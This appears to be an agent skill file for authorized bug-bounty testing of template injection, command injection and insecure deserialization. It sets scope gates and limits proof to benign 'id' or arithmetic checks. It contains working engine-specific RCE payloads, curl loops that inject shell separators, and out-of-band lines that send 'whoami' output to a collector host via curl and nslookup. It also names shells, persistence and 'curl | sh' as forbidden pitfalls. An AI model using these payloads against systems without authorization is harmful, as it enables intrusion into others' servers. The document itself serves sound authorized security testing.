---
name: zp-rce-ssti
description: ZeroProtocol hunter for server-side template injection, command injection, expression-language injection and insecure deserialization. Use when template syntax is evaluated in a response, when a parameter reaches a shell, when testing for RCE, when a serialized object is accepted (Java, PHP, Python pickle, .NET, Ruby), or when a math expression in input gets computed. Proves execution with a benign arithmetic or identity command and stops - no shells, no persistence, no reading beyond proof.
---

# zp-rce-ssti - proving execution without taking the box

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

**The proof bar, and the hard limit:** `7*7` returning `49` is confirmed SSTI - **High**, and
Critical only once code execution, file read or secret access follows from it. `id` returning
`uid=…` is confirmed RCE - **Critical**. Either is a complete, accepted finding on its own, and
neither needs more. A reverse shell is not a better report - it is
unauthorized access to a system, it is almost always outside what any program authorizes, and
it turns a bounty into an incident response.

When you confirm execution: capture it, clean up anything you wrote, and **report immediately**.
RCE is the one class where delay is itself a risk to the target.

---

## SSTI

**1. Detect with a polyglot that is safe in every engine.**

```
${{<%[%'"}}%\.        ${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  @(7*7)  {7*7}  ${{7*7}}  {{7*'7'}}
```

A polyglot that errors tells you a template engine is parsing your input; `49` tells you which.

```bash
for p in '${7*7}' '{{7*7}}' '<%=7*7%>' '#{7*7}' '@(7*7)' '{7*7}' '{{7*"7"}}'; do
  printf '%-12s ' "$p"
  curl -sk --get --data-urlencode "name=$p" "https://$H/greet" | grep -oE '(49|7777777|Error[^<]{0,60})' | head -1
done
```

**2. Fingerprint the engine from what evaluated.**

| Returned | Engine | Next probe (read-only) |
|---|---|---|
| `49` from `{{7*7}}`, then `7777777` from `{{7*'7'}}` | Jinja2 (Python/Flask) | `{{config.items()}}` · `{{self}}` |
| `49` from `{{7*7}}`, then `49` again from `{{7*'7'}}` | Twig (PHP) | `{{_self}}` · `{{['id']|filter('system')}}` |
| `49` from `${7*7}` | FreeMarker / JSP-Jakarta EL / Thymeleaf `${…}` | `${product.class}` · `[[${7*7}]]` |
| `49` from `<%= 7*7 %>` | ERB (Ruby) / ASP | `<%= RUBY_VERSION %>` |
| `49` from `#{7*7}` | Ruby interpolation / JSF-Jakarta EL / Pug / SpEL template | `#{7*7}` in a Spring app = SpEL |
| `49` from `@(7*7)` | Razor (.NET) | `@System.Environment.MachineName` |
| `49` from `{7*7}` | Smarty (PHP) | `{$smarty.version}` |
| `49` from `#set($zp=7*7)$zp` | Velocity (Java) | `$zp.class` · `#foreach` and `$!{}` behaviour |
| parse error on `{{7*7}}`, but `{{printf "%d" 49}}` returns `49` | Go text/html template | `{{.}}` shows the whole context |
| `$49` from `${{7*7}}` | a `{{ }}` engine with the `$` reflected literally | re-test with bare `{{7*7}}` |

Three of those rows are measured, not folklore. Jinja2 3.1.2 renders `{{7*'7'}}` as `7777777`
(Python `int*str`) and `${{7*7}}` as `$49`; Twig coerces the numeric string and returns `49`, so
`7777777` is the Jinja2-only signature and nothing errors either way. Go templates have no infix
arithmetic - `{{7*7}}` is a parse error (`unexpected "*" in operand`), so `49` can never come back
from Go; fingerprint it on a builtin instead. Velocity treats `${…}` as a *formal reference*, not
an expression: `${7*7}` is emitted literally and arithmetic needs the `#set` directive.

**3. Escalate to a benign identity call, then stop.** Do not go past this.

```
Jinja2      {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
            {{ ''.__class__.__mro__[1].__subclasses__() }}       (enumeration only - noisy)
            {{ config.items() }}                                  (often leaks SECRET_KEY)
Twig        {{ ['id']|filter('system') }}
Smarty      {$smarty.version}   (version first; {php}…{/php} only on Smarty 2 / unsandboxed)
FreeMarker  ${"freemarker.template.utility.Execute"?new()("id")}
Velocity    #set($e="")  $e.getClass().forName("java.lang.Runtime")...
ERB         <%= `id` %>   or   <%= IO.popen('id').read %>
SpEL        #{T(java.lang.Runtime).getRuntime().exec('id')}      (SpEL's template delimiter is #{…})
            Thymeleaf:  __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
Razor       @System.Environment.UserName   ·   @System.Environment.MachineName
Go          {{.}}  — Go templates do not eval arbitrary code; impact is context disclosure
```

Match the delimiter to the detection. A bare `${…}` in Spring is a property placeholder, not a
SpEL expression, so the `${T(…)}` form everyone copies evaluates nothing against a `#{…}` sink -
and you kill a live bug. Note also that `Runtime.exec` returns a *Process*: nothing reaches the
response, so that gadget is **blind**. To land the `uid=…` proof, read the stream -
`#{new String(T(java.lang.Runtime).getRuntime().exec('id').getInputStream().readAllBytes())}` -
or confirm out of band and say in the report that it was blind.

Razor is .NET and usually Windows, where there is no `id` binary (`Process.Start("id")` throws
`Win32Exception`) and a returned `Process` renders no output either way. `Environment.UserName`
is the in-process identity proof - it spawns nothing and it renders.

`id` on POSIX, `whoami` on Windows: they prove execution, change nothing, and read no data. Use
nothing else.

`{{config}}` in Flask/Jinja2 deserves its own note - it commonly leaks `SECRET_KEY`, which is
session-forging capability on its own. Redact it in your evidence.

---

## Command injection

**4. Separators and a timing oracle.** Blind is the common case, so make the oracle statistical.

```
;id    |id    ||id    &&id    &id    `id`    $(id)    %0aid    %0d%0aid
newline injection in a filename or parameter · argument injection: --output=/tmp/x · -o
```

`%0a` (LF) is the separator that works; a bare `%0d` (CR) is not one - measured,
`bash -c "$(printf 'echo one\recho two')"` runs a *single* command and prints `oneecho two`.
Carry CR only as part of `%0d%0a`, or in header and log-injection contexts.

```bash
for p in ';sleep 5' '|sleep 5' '||sleep 5' '&&sleep 5' '`sleep 5`' '$(sleep 5)' '%0asleep 5'; do
  printf '%-14s ' "$p"
  curl -sk -o /dev/null -w '%{time_total}\n' --max-time 20 \
    --get --data-urlencode "host=127.0.0.1$p" "https://$H/api/ping"
done
```

Repeat 10 times interleaved with a `sleep 0` control and require a 2-sigma separation, exactly
as in `zp-sqli`. One slow response is network noise.

Out-of-band is cleaner than timing when available, but the output has to go in the **label**:
`;nslookup $(whoami|tr -d ' \n').rce.$COLLECTOR` or `;curl http://$(whoami).rce.$COLLECTOR/`.
Putting it in the path - `;curl http://rce.$COLLECTOR/$(whoami)` - resolves only the fixed host,
so on a target with DNS egress but no outbound HTTP you get a bare lookup carrying nothing and
conclude there is no execution. A label holds at most 63 bytes and no spaces or newlines, so
`| tr -d ' \n' | cut -c1-40` the output first.

**5. Argument injection** is under-hunted: a parameter concatenated into a command line without
a shell still lets you add *flags*. `--output`, `-o`, `--config`, `-e`, `@file` can write files
or read them, with no metacharacter needed.

---

## Deserialization

**6. Identify the format before doing anything.**

| Marker | Format | Note |
|---|---|---|
| `rO0AB` (base64) or `\xac\xed\x00\x05` | Java serialized | `ysoserial` gadget chains |
| `O:8:"stdClass"` / starts `a:1:{` | PHP serialized | POP chain via magic methods |
| `gASV` / `\x80\x04` | Python pickle | pickle is RCE by design |
| `AAEAAAD/////` | .NET BinaryFormatter | `ysoserial.net` |
| `!ruby/object:` | Ruby YAML/Marshal | unsafe `YAML.load` |
| `{"@type":"com.…"}` | Jackson/fastjson polymorphic | type-handling gadget |
| `_$$ND_FUNC$$_` | Node `node-serialize` | direct function eval |

**7. Confirm with the least invasive probe available.** Prefer a DNS-callback gadget (e.g. a
URLDNS-style chain for Java) over a command-execution gadget: a DNS hit proves the sink is
reachable and deserializing, without running a command on the target.

```
Java:   ysoserial URLDNS "http://deser.$COLLECTOR"   -> confirmed by a DNS hit alone
PHP:    flip one byte in the serialized string and watch for a type/magic-method error
Python: a pickle that imports a harmless module and errors distinctively
```

Only escalate to a command gadget if the program explicitly requires demonstrated execution,
and then use `id`.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| `49` returned from a template expression | **confirmed SSTI.** High even before code execution |
| `uid=…` from `id` | **confirmed RCE.** Critical. Stop and report |
| timing separated by >2 sigma over 10 interleaved samples | confirmed blind injection |
| a single slow response | not confirmed |
| OOB callback with the command output in a DNS label | confirmed, and the cleanest evidence form |
| URLDNS gadget produces a DNS hit | confirmed unsafe deserialization. Critical, no command run |
| template error but no evaluation | input reaches a parser, no impact shown. Informational/Low - hold it, or pair it with verbose-error disclosure or evaluation in another sink, and list the variants tried |
| `{{7*7}}` reflected literally | no template evaluation. Killed |
| `49` appears but the app does client-side templating (Vue/Angular) | that is client-side; it is XSS-adjacent -> `zp-xss`, not RCE |
| `{{config}}` leaks `SECRET_KEY` | confirmed, High - session forging. Redact the key |
| math evaluated but every callable is blocked by a sandbox | real finding at reduced severity. Say the sandbox held |

**The false positive that matters most:** client-side template injection in a Vue or Angular
app. `{{7*7}}` becoming `49` in the *browser* is not server-side anything. Check whether the
evaluation happened in the response body as delivered (`curl`) or only after JS ran.

---

## High-value patterns

- **Email/notification templates** users can edit - name, signature, invoice footer, custom message.
- **Report, invoice and PDF generators** taking a user-supplied template.
- **Bulk import/export field mappings** with expression support.
- **Search or filter DSLs** that turn out to be a real expression language (SpEL especially).
- **Any "custom formula" or "dynamic field" feature** - that is a template engine with a marketing name.
- **`ping`/`traceroute`/`nslookup` diagnostic endpoints** in admin panels - textbook command injection.
- **Image/document conversion** shelling out to ImageMagick, ffmpeg, LibreOffice or Ghostscript - and check known CVEs for those.

---

## Pitfalls

- **Opening a shell.** The hard line in this skill. `id` is the proof.
- **Running anything destructive** as an "impact demo" - no `rm`, no writes outside `/tmp`, no service restarts, no `curl | sh`.
- **Persisting.** No cron, no keys, no webshell, no user. If you wrote a file to prove a write, delete it and say so.
- **Reading data beyond proof.** `/etc/passwd` is a convention, not a requirement; `id` is enough.
- **Escalating a deserialization sink with a command gadget** when URLDNS already proved it.
- **Reporting client-side template injection as RCE.**
- **One payload per engine and declaring it clean.** Walk the engine table.
- **Timing claims without statistics.**
- **Leaving a `{{config}}` dump with a live `SECRET_KEY` unredacted** in your notes or report.
- **Sitting on it.** Confirmed RCE gets reported the same hour.

---

## Hand off to

Confirmed -> `zp-triage` (it will pass) then `zp-report`, immediately.
File read rather than execution -> `zp-xxe-lfi`. Reached via an upload -> `zp-upload`.
Reached via SSRF to an internal service -> `zp-ssrf`. Cloud credentials visible from the
executing host -> `zp-cloud` for blast radius only. Source available -> `zp-code-audit` to find
the other call sites of the same sink.
